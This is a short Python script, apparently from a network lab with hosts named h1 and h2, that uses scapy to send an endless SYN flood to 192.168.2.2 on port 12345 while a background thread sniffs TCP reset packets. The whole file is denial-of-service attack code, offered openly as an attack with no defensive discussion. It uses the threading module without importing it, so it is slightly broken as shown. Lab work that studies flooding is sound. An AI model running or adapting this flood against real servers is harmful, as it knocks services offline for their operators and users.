from scapy.all import *
import random
import time


def syn_flood():
    server_ip = "192.168.2.2"  # h2's IP address
    server_port = 12345  # Port to attack

    print(f"[*] Starting SYN flood attack on {server_ip}:{server_port}...")

    while True:
        src_ip = "192.168.1.2"  # Use h1's real IP
        src_port = 1234

        # Build the SYN packet
        seq = random.randint(1000, 9000)  # Random sequence number
        syn = IP(src=src_ip, dst=server_ip) / TCP(
            sport=src_port, dport=server_port, flags="S", seq=seq
        )

        # Send the SYN packet
        send(syn, verbose=False)
        print(
            f"[+] Sent SYN packet from {src_ip}:{src_port} to {server_ip}:{server_port}"
        )

        # Optional: Adjust speed of attack
        # time.sleep(0.01)  # 10ms delay to reduce network saturation (adjust as needed)


def sniff_rst_packets():
    print("[*] Starting RST packet sniffer...")

    def handle_packet(packet):
        if packet.haslayer(TCP) and packet[TCP].flags == "R":
            print(
                f"[RST] RST packet detected: {packet[IP].src} -> {packet[IP].dst}:{packet[TCP].dport}"
            )

    sniff(filter="tcp[tcpflags] & tcp-rst != 0", prn=handle_packet, store=False)


if __name__ == "__main__":
    rst_sniffer_thread = threading.Thread(target=sniff_rst_packets, daemon=True)
    rst_sniffer_thread.start()
    syn_flood()
